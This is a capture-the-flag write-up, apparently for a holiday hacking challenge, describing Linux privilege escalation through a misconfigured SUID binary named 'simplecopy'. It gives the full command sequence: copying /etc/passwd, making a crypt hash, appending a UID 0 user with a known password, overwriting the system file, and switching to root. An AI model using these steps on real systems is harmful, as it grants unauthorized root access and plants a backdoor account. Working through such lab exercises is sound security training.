# OBJECTIVE 7 - Linux PrivEsc

## OBJECTIVE  
Help Rosemold in the Ostrich Saloon on the Island of Misfit Toys escalate privileges on a Linux system to uncover a hidden island tip.

## Hints

Hints provided for Objective 7  
- There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system.  
- Using the privileged binary to overwrite a file could work, but there’s a more clever approach with the right argument.

---

## My Approach

### Step 1: Identifying SUID Binaries  
I started by listing all binaries in `/bin` that have the SUID bit set, meaning they run with root privileges:

```bash
ls -la /bin | grep rwsr
```

Among the usual suspects like `passwd`, `su`, and `mount`, I noticed an unfamiliar one: `simplecopy`.

### Step 2: Crafting a Malicious /etc/passwd File  
Since `simplecopy` runs as root, I realized I could use it to overwrite system files like `/etc/passwd`. I made a copy of the current passwd file:

```bash
cat /etc/passwd > /tmp/new-passwd
```

Next, I created a password hash for a new user using Perl:

```bash
perl -le 'print crypt("snowballz", "abc")'
```

This returned a hash: `abCF8jIEHXtsw`

I then added a new root-level user to the end of the copied file:

```bash
echo super-elf:abCF8jIEHXtsw:0:0:root:/root:/bin/bash >> /tmp/new-passwd
```

### Step 3: Overwriting /etc/passwd  
Using `simplecopy`, I replaced the system’s passwd file with my modified version:

```bash
simplecopy /tmp/new-passwd /etc/passwd
```

### Step 4: Switching to Root  
I switched to my newly created user:

```bash
su super-elf
```

After entering the password `snowballz`, I confirmed I had root access:

```bash
whoami
# root
```

### Step 5: Completing the Challenge  
I navigated to the root directory and executed the final binary:

```bash
cd /root
./runmetoanswer
```

## Result

I successfully escalated to root using the `simplecopy` SUID binary and completed the objective by running the final executable located in `/root`.

## Lessons Learned

This challenge demonstrated a classic Linux privilege escalation technique—using a misconfigured SUID binary to overwrite sensitive files. It reinforced how dangerous writable system files can be when paired with improper permissions and showed the power of knowing how Linux authentication works at the file level.
